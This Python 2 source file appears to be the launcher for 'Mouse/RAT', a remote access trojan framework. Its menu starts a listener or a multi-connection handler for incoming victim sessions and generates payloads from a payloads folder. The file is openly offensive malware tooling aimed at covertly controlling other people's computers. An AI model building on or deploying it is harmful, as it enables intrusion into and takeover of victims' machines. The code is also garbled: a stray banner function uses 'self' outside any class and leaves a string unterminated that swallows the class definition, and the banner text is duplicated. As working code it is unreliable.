#!/usr/bin/python
from modules import server
from modules import helper as h
import sys, os


#banner

def banner():
    self.banner_text = h.WHITE+"""
               _     __,..---""-._                 ';-,
        ,    _/_),-"`             '-.                `\\
       \|.-"`    -_)                 '.                ||
       /`   a   ,                      \              .'/
       '.___,__/                 .-'    \_        _.-'.'
          |\  \      \         /`        _`""""""`_.-'
             _/;--._, >        |   --.__/ `""""""`
           (((-'  __//`'-......-;\      )
                (((-'       __//  '--. /   Mouse/RAT
                          (((-'    __//
                                 (((-'
"""+h.WHITE+"\nVersion: 1.6\nDeveloped by Entynetproject (Ivan Nikolsky)\n"+h.ENDC
        self.main_menu_text = h.WHITE+"-"*40+"""
        

class mouse:
    def __init__(self):
        h.generate_keys()
        self.server = server.Server()
        if len(sys.argv) == 2 and sys.argv[1] == "debug":
            self.server.debug = True
        else:
            self.server.debug = False
        self.payloads = self.import_payloads() 
        self.banner_text = h.WHITE+"""
               _     __,..---""-._                 ';-,
        ,    _/_),-"`             '-.                `\\
       \|.-"`    -_)                 '.                ||
       /`   a   ,                      \              .'/
       '.___,__/                 .-'    \_        _.-'.'
          |\  \      \         /`        _`""""""`_.-'
             _/;--._, >        |   --.__/ `""""""`
           (((-'  __//`'-......-;\      )
                (((-'       __//  '--. /   Mouse/RAT
                          (((-'    __//
                                 (((-'
"""+h.WHITE+"\nVersion: 1.6\nDeveloped by Entynetproject (Ivan Nikolsky)\n"+h.ENDC
        self.main_menu_text = h.WHITE+"-"*40+"""

    """+h.GREEN_THIN+"""1"""+h.WHITE+""") Start Server
    """+h.GREEN_THIN+"""2"""+h.WHITE+""") Start MultiHandler
    """+h.GREEN_THIN+"""3"""+h.WHITE+""") Create Payload
    """+h.GREEN_THIN+"""0"""+h.WHITE+""") Exit

"""+h.NES


    # Actions
    def print_payload(self,payload,number_option):
        print " " * 4 + str(number_option) + "): " + payload.name


    def start_single_server(self):
        if not self.server.set_host_port():
            return
        self.server.start_single_handler()


    def start_multi_handler(self):
        if not self.server.set_host_port():
            return
        self.server.start_multi_handler()


    def prompt_run_server(self):
        if raw_input(h.NES+"Start Server? (Y/n): ") == "n":
            return
        else:
            if raw_input(h.NES+"MultiHandler? (y/N): ") == "y":
                self.server.start_multi_handler()
            else:
                self.server.start_single_handler()


    def import_payloads(self):
        path = "modules/payloads"
        sys.path.append(path)
        modules = dict()
        for mod in os.listdir(path):
            if mod == '__init__.py' or mod[-3:] != '.py':
                continue
            else:
                m = __import__(mod[:-3]).payload()
                modules[m.name] = m
        return modules


    def exit_menu(self):
        os.system("clear")
        exit()


    def choose_payload(self):
        os.system("clear")
        print h.WHITE+"-"*40+h.ENDC
        print("")
        number_option = 1
        for key in self.payloads:
            payload = self.payloads[key]
            self.print_payload(payload,number_option)
            number_option += 1
        print ""
        while 1:
            try:
                # choose payload
                option = raw_input(h.info_general_raw("Choose an payload> "))
                if not option:
                  continue
                selected_payload = self.payloads[self.payloads.keys()[int(option) - 1]]
                # set host and port
                self.server.set_host_port()
                # generate payload
                selected_payload.run(self.server)
                #run
                self.prompt_run_server()
                break
            except KeyboardInterrupt:
                break
            except Exception as e:
                print e
                break


    def menu(self,err=""):
        while 1:
            try:
                h.clear()
                if err:
                    print err
                if self.server.debug:
                    print "Debug On"
                sys.stdout.write(self.banner_text)
                option = raw_input(self.main_menu_text)
                choose = {
                    "1" : self.start_single_server,
                    "2" : self.start_multi_handler,
                    "3" : self.choose_payload,
                    "0" : self.exit_menu
                }
                try:
                    choose[option]()
                    self.menu()
                except KeyError:
                    if option:
                        self.menu()
                    else:
                        self.menu()
                except KeyboardInterrupt:
                    continue
                    # TODO: quit socket listener
            except KeyboardInterrupt:
                
                exit()


if __name__ == "__main__":
    mouse = mouse()
    mouse.menu()
